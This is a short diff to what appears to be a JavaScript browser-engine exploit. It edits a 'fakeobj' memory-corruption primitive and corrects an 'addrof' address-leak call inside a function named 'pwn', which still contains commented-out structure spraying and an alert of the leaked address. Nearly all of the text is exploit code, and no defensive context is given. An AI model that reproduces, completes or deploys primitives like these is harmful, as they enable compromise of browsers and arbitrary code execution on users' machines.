@@ -122,7 +122,7 @@ fakeobj: function (addr) {
     victim5[2] = addr;
     hax(backup);
   return victim5[0];
-}};
+},};
 
 //let stage1 = primitives;
 /*
@@ -142,7 +142,7 @@ function pwn() {
    // sprayStructures();
 
     var targetArray = new Array();
-    var realjscell = primitives.addrof(targetArray[0])
+    var realjscell = primitives.addrof(targetArray)
     alert(realjscell)
 
 }
